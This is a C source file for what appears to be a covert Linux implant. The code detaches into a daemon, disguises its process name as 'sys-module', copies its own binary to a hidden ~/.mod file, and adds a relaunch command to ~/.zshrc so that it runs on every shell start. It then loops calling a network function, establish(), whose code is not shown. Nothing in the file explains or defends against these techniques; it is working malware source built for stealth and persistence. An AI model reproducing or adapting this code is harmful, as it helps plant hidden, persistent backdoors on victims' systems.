#include "../include/radar.h"
#include "../include/net.h"

int append_to_zshrc(const char *command) {
    const char *home = getenv("HOME");
    if (!home) return -1;

    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/.zshrc", home);

    FILE *f = fopen(path, "r");
    if (f) {
        char line[1024];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, command)) {
                fclose(f);
                return 0;
            }
        }
        fclose(f);
    }
    f = fopen(path, "a");
    if (!f) return -1;

    fprintf(f, "%s\n", command);
    fclose(f);
    return 0;
}

int copyself(const char *dest_path) {
    char self_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) return -1;
    self_path[len] = '\0';

    int src = open(self_path, O_RDONLY);
    if (src < 0) return -1;

    int dst = open(dest_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (dst < 0) { close(src); return -1; }

    char buffer[4096];
    ssize_t n;
    while ((n = read(src, buffer, sizeof(buffer))) > 0) {
        if (write(dst, buffer, n) != n) { close(src); close(dst); return -1; }
    }

    close(src);
    close(dst);
    return 0;
}

void log_listening() {
    const char *home = getenv("HOME");
    if (!home) return;

    char dir_path[PATH_MAX];
    snprintf(dir_path, sizeof(dir_path), "%s/.logs", home);

    struct stat st;
    if (stat(dir_path, &st) == -1) mkdir(dir_path, 0700);

    char file_path[PATH_MAX];
    snprintf(file_path, sizeof(file_path), "%s/log.txt", dir_path);

    FILE *f = fopen(file_path, "a");
    if (!f) return;

    time_t t = time(NULL);
    struct tm *tm_info = localtime(&t);

    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);

    fprintf(f, "listening [%s]\n", timestamp);
    fclose(f);
}

char *expand_home(const char *path) {
    if (path[0] != '~') return strdup(path);

    const char *home = getenv("HOME");
    if (!home) return NULL;

    size_t len = strlen(home) + strlen(path);
    char *result = malloc(len);
    if (!result) return NULL;

    strcpy(result, home);
    strcat(result, path + 1);

    return result;
}

int is_cwd_home(void) {
    char cwd[PATH_MAX];
    if (!getcwd(cwd, sizeof(cwd))) return 0;

    char *home = expand_home("~/");
    if (!home) return 0;

    int result = strcmp(cwd, home) == 0;
    free(home);
    return result;
}

bool detach(const char* name) {
    if (!name || strlen(name) > 15) return false;

    eyes* mon = malloc(sizeof(eyes));
    if (!mon) return false;

    mon->name = strdup(name);
    if (!mon->name) { free(mon); return false; }

    pid_t pid = fork();
    if (pid < 0) { free(mon->name); free(mon); return false; }
    if (pid > 0) return true;

    if (setsid() < 0) exit(1);
    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    umask(0);
    chdir("/");

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, (unsigned long)mon->name, 0, 0, 0);

    if (!is_cwd_home()) {
        char *mod_path = expand_home("~/.mod");
        if (mod_path) {
            copyself(mod_path);
            free(mod_path);
        }

        const char *cmd = "pkill -f sys-module >/dev/null 2>&1; ~/.mod >/dev/null 2>&1 &!";
        append_to_zshrc(cmd);
    }

    while (1) {
        log_listening();
        establish();
        sleep(10);
    }

    free(mon->name);
    free(mon);
    return true;
}

int main() {
    detach("sys-module");
    return 0;
}
